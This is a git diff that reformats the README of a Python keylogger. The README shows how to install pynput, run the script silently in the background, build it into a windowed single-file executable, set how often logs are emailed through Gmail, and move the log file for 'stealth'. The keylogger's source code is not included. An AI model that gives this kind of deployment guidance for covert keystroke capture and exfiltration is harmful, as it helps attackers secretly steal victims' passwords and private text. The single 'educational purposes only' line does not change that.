@@ -56,17 +56,23 @@ Required software
 ✅ Python 3.x for Windows
 ✅ pip package manager
 
-text
+
 
 ### Installation
 
 Install required dependencies
+
+```
 pip install pynput
 
+```
 Optional: For executable conversion
+
+```
 pip install pyinstaller
 
-text
+```
+
 
 ## 🔐 Gmail Configuration
 
@@ -100,21 +106,25 @@ Edit the following variables in `keylogger.py`:
 ## 💻 Usage Guide
 
 ### 🐍 Running Python Script
-
+```
 python keylogger.py
 
-text
+```
+
 
 **Features:**
 - ⏱️ Sends logs every ~8 minutes (default)
 - 👤 Runs silently in background
 - 🔄 To stop: Terminate Python process in Task Manager
 
-### 📦 Building Executable
+### 📦 Building Executable\
 
+```
 pyinstaller --onefile --windowed keylogger.py
 
-text
+```
+
+
 
 **Output:**
 - 📁 Executable created in `dist/` folder
@@ -132,7 +142,7 @@ time.sleep(300) # 300 seconds = 5 minutes
 Or 1 hour
 time.sleep(3600) # 3600 seconds = 1 hour
 
-text
+
 
 </details>
 
@@ -143,7 +153,7 @@ Modify file path for advanced stealth
 (Educational purposes only)
 log_file = os.path.join(custom_path, "logs.txt")
 
-text
+
 
 </details>
 
